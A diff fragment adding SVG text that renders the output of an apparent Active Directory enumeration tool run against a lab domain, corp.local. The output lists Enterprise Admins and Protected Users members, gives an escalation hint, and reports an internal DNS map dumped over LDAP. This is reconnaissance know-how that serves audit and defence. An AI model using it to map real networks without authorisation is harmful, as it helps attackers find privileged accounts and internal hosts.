+<text x="86.5" y="6731.5" fill="#6e7681" xml:space="preserve">  • Administrateur</text>
+<text x="31.7" y="6749.0" fill="#6e7681" font-weight="bold" xml:space="preserve">[INFO]</text>
+<text x="86.5" y="6749.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Enterprise Admins — 1 member(s)</text>
+<text x="86.5" y="6766.5" fill="#6e7681" xml:space="preserve">Full control of every domain in the forest.</text>
+<text x="86.5" y="6784.0" fill="#6e7681" xml:space="preserve">  • Administrateur</text>
+<text x="31.7" y="6801.5" fill="#6e7681" font-weight="bold" xml:space="preserve">[INFO]</text>
+<text x="86.5" y="6801.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;Protected Users&#x27; has 1 member(s)</text>
+<text x="86.5" y="6819.0" fill="#6e7681" xml:space="preserve">Members (1):</text>
+<text x="86.5" y="6836.5" fill="#6e7681" xml:space="preserve">  • pu-test</text>
+<text x="86.5" y="6871.5" fill="#6e7681" xml:space="preserve">Escalation: Defensive group (hardens members&#x27; Kerberos: no NTLM/RC4/delegation). Note which privileged accounts are NOT in it.</text>
+<text x="31.7" y="6889.0" fill="#6e7681" font-weight="bold" xml:space="preserve">[INFO]</text>
+<text x="86.5" y="6889.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ADIDNS — internal name→IP map leaked (22 host record(s))</text>
+<text x="86.5" y="6906.5" fill="#6e7681" xml:space="preserve">AD-integrated DNS is readable over LDAP → the full internal DNS map was dumped without a single DNS query or zone transfer. Cross-reference with the computers module for hosts not joined to AD (appliances, Linux, network gear):</text>
+<text x="86.5" y="6924.0" fill="#6e7681" xml:space="preserve">  *.corp.local, DomainDnsZones.corp.local, ForestDnsZones.corp.local, a.root-servers.net.RootDNSServers, b.root-servers.net.RootDNSServers, c.root-servers.net.RootDNSServers, corp.local, d.root-servers.net.RootDNSServers, dc01.corp.local, e.root-servers.net.RootDNSServers, f.root-servers.net.RootDNSServers, fileserver.corp.local, g.root-servers.net.RootDNSServers, gc._msdcs.corp.local, h.root-servers.net.RootDNSServers, i.root-servers.net.RootDNSServers, intranet.corp.local, j.root-servers.net.RootDNSServers, k.root-servers.net.RootDNSServers, l.root-servers.net.RootDNSServers …</text>
 </svg>
